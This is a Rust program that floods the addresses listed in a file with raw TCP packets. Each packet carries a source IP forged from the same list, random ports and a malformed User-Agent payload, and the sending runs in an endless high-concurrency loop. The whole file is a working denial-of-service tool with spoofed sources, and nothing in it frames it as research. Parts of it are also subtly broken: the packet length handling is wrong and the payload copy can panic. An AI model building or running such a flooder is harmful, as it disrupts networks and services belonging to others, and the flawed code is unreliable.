use pnet::packet::{ip::IpNextHeaderProtocols, Packet};
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::tcp::MutableTcpPacket;
use pnet::transport::{transport_channel, TransportChannelType::Layer3};
use rand::{seq::SliceRandom, Rng};
use std::{fs, time::Duration};
use tokio::sync::Semaphore;
use std::net::Ipv4Addr;

const MIN_PACKET_SIZE: usize = 40; // Minimum size to fit headers
const MAX_PACKET_SIZE: usize = 60; // Adjust to desired max packet size
const MAX_THREADS: usize = 100;    // Adjust as needed

async fn send_random_packet_with_user_agent(ip_list: &[Ipv4Addr], semaphore: &Semaphore) {
    let _permit = semaphore.acquire().await.unwrap();

    let packet_size = rand::thread_rng().gen_range(MIN_PACKET_SIZE..MAX_PACKET_SIZE);
    let mut packet = vec![0u8; packet_size];
    let mut ipv4_packet = MutableIpv4Packet::new(&mut packet[..20]).unwrap();

    // Random source and destination IPs
    let src_ip = *ip_list.choose(&mut rand::thread_rng()).unwrap();
    let mut dst_ip = *ip_list.choose(&mut rand::thread_rng()).unwrap();
    while dst_ip == src_ip {
        dst_ip = *ip_list.choose(&mut rand::thread_rng()).unwrap();
    }

    // Set random source and destination ports
    let mut rng = rand::thread_rng();
    let src_port: u16 = rng.gen_range(1024..65535);
    let mut dst_port: u16 = rng.gen_range(1024..65535);
    while dst_port == src_port {
        dst_port = rng.gen_range(1024..65535);
    }

    // Fill in IPv4 packet details
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(packet_size as u16);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ipv4_packet.set_source(src_ip);
    ipv4_packet.set_destination(dst_ip);

    // Add a TCP packet with random ports
    let mut tcp_packet = MutableTcpPacket::new(&mut packet[20..]).unwrap();
    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_data_offset(5); // Minimal TCP header

    // Add User-Agent payload with broken ASCII characters
    let user_agent = b"User-Agent: neko\x80\x81\r\n";
    tcp_packet.payload_mut().copy_from_slice(user_agent);

    // Send packet with error handling
    match transport_channel(1024, Layer3(IpNextHeaderProtocols::Tcp)) {
        Ok((mut tx, _)) => {
            if tx.send_to(ipv4_packet.packet(), dst_ip.into()).is_err() {
                eprintln!("Failed to send packet from {}:{} to {}:{}", src_ip, src_port, dst_ip, dst_port);
            }
        }
        Err(e) => eprintln!("Failed to open transport channel: {:?}", e),
    }
}

async fn continuous_packet_flood(ip_list: Vec<Ipv4Addr>) {
    let semaphore = Semaphore::new(MAX_THREADS);

    loop {
        let permits: Vec<_> = (0..MAX_THREADS)
            .map(|_| send_random_packet_with_user_agent(&ip_list, &semaphore))
            .collect();

        futures::future::join_all(permits).await;
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

fn load_ip_list(filename: &str) -> Vec<Ipv4Addr> {
    fs::read_to_string(filename)
        .expect("Failed to read IP list")
        .lines()
        .map(|line| line.parse().unwrap()) // No validation; expects each line to be a valid IP
        .collect()
}

#[tokio::main]
async fn main() {
    let ip_list = load_ip_list("ips.txt");
    continuous_packet_flood(ip_list).await;
}
